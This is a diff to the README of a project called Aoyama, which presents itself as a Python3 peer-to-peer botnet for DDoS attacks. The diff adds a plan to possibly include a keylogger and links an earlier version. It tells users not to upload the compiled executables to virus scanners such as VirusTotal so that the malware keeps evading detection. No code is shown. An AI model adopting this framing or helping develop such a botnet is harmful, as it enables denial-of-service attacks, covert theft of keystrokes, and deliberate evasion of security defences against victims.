@@ -1,5 +1,7 @@
 # Aoyama
-A New version of Python3 P2P botnet, old version: http://github.com/Leeon123/Python3-botnet
+Aoyama is a New version of Python3 P2P botnet, old version: http://github.com/Leeon123/Python3-botnet
+
+Aoyama is for ddos(Maybe add more function later, maybe...keylogger?)
 
 ***PLS Don't scan the executable file generated from pyinstaller or py2exe on any virus scanner(such as VirusTotal), if you want to keep using this project(i will continue update the code) and not be detected*** 
 
